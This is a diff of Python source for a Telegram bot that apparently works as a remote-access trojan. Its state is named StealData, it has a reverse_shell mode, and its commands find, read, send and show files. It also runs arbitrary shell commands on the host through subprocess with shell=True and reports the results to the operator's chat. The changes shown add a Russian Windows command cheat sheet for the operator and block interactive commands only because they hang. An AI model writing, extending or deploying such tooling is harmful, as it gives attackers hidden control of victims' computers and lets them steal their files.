@@ -61,6 +61,41 @@ async def action(message: Message, state: FSMContext):
             await state.set_state(StealData.reverse_shell)
         if user_command == "/help":
             await message.answer("Доступные команды: /shell, /find, /read, /send, /show /help")
+            await message.answer("""**🖥️ Windows CMD - Шпаргалка**
+
+**📁 Навигация:**
+• `cd` - показать текущую папку
+• `cd C:\\path\\to\\dir` - перейти в папку
+• `dir` - список файлов
+• `cd ..` - вернуться на уровень выше
+
+**📄 Файлы и папки:**
+• `copy nul file.txt` - создать файл
+• `mkdir folder` - создать папку
+• `del file.txt` - удалить файл
+• `rmdir folder` - удалить папку
+• `rename old new` - переименовать
+• `copy file1 file2` - копировать
+• `move file.txt dir\\` - переместить
+
+**👀 Просмотр файлов:**
+• `type file.txt` - показать содержимое
+
+**🌐 Сеть:**
+• `ping site.com` - проверка соединения
+• `ipconfig` - показать IP
+• `tracert site.com` - трассировка
+• `netstat -an` - открытые порты
+
+**⚙️ Процессы:**
+• `tasklist` - список процессов
+• `taskkill /PID 1234` - завершить процесс
+• `systeminfo` - информация о системе
+
+**🔍 Поиск:**
+• `dir /s *file*` - поиск файла
+• `find "text" file.txt` - поиск текста в файле""", parse_mode="Markdown")
+
             await state.set_state(StealData.waiting_for_action)
     if user_command not in ['/find' ,'/read', '/send', '/show', '/shell', '/help']:
         await message.answer("❌ Неправильная команда!")
@@ -111,7 +146,6 @@ async def search_word(message: Message, state: FSMContext):
     if search_word[0].lower() == "exit":
         await message.answer("Выход из режима find") 
         await message.answer("Доступные команды: /shell, /find, /read, /send, /show /help")
-
         await state.set_state(StealData.waiting_for_action)
         return
     
@@ -158,6 +192,13 @@ async def shell(message: Message, state: FSMContext):
         await message.answer("Доступные команды: /shell, /find, /read, /send, /show /help")
         await state.set_state(StealData.waiting_for_action)
         return
+    
+    # Проверка на опасные команды
+    dangerous_commands = ['cmd', 'powershell', 'python', 'node', 'mysql', 'psql']
+    if command.lower().strip() in dangerous_commands:
+        await message.answer(f"❌ Команда '{command}' заблокирована (может зависнуть)")
+        return
+    
     try:
         result = subprocess.run(command, shell=True, capture_output=True, timeout=30, encoding="cp866",  errors="replace")
         
@@ -199,11 +240,11 @@ async def send_file(message: Message, state: FSMContext):
         await message.answer(f"Ошибка: {e}")
     
 
+
 async def main():
     await bot.send_message(chat_id=CHAT_ID, text = "Bot was started")
     await bot.send_message(chat_id=CHAT_ID, text = "Напиши команду /start , чтобы начать пользоваться ботом")
-    await dp.start_polling(bot)
-    
+    await dp.start_polling(bot)    
 
 if __name__ == "__main__":
     try:
